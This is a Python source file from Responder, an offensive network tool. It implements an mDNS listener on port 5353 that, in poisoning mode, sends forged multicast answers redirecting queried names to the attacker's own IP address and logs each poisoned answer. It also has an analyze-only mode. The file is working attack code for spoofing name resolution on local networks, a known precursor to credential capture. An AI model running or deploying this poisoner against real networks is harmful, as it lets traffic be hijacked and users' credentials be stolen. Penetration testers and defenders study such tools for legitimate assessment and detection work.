#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import core.responder.settings as settings
import socket
import threading

from SocketServer import BaseRequestHandler, ThreadingMixIn, UDPServer
from core.responder.packets import MDNS_Ans
from core.responder.utils import *

def start():
	try:
		server = ThreadingUDPMDNSServer(('', 5353), MDNSServer)
		t = threading.Thread(name='MDNS', target=server.serve_forever)
		t.setDaemon(True)
		t.start()
	except Exception as e:
		print "Error starting MDNS server on port 5353: {}".format(e)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
	
	allow_reuse_address = 1

	def server_bind(self):
		MADDR = "224.0.0.251"
		
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

def Parse_MDNS_Name(data):
	try:
		data = data[12:]
		NameLen = struct.unpack('>B',data[0])[0]
		Name = data[1:1+NameLen]
		NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
		Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
		return Name+'.'+Name_
	except IndexError:
		return None

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNSServer(BaseRequestHandler):

	def handle(self):

		MADDR = "224.0.0.251"
		MPORT = 5353

		data, soc = self.request
		Request_Name = Parse_MDNS_Name(data)

		# Break out if we don't want to respond to this host
		if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
			return None

		try:
			# Analyze Mode
			if settings.Config.AnalyzeMode:
				if Parse_IPV6_Addr(data):
					settings.Config.AnalyzeLogger.warning('{} [Analyze mode: MDNS] Request for {}, ignoring'.format(self.client_address[0], Request_Name))

			# Poisoning Mode
			else:
				if Parse_IPV6_Addr(data):
					
					Poisoned_Name = Poisoned_MDNS_Name(data)
					Buffer = MDNS_Ans(AnswerName = Poisoned_Name, IP=socket.inet_aton(settings.Config.Bind_To))
					Buffer.calculate()
					soc.sendto(str(Buffer), (MADDR, MPORT))
					
					settings.Config.PoisonersLogger.warning('{} [MDNS] Poisoned answer for name {}'.format(self.client_address[0], Request_Name))

		except Exception:
			raise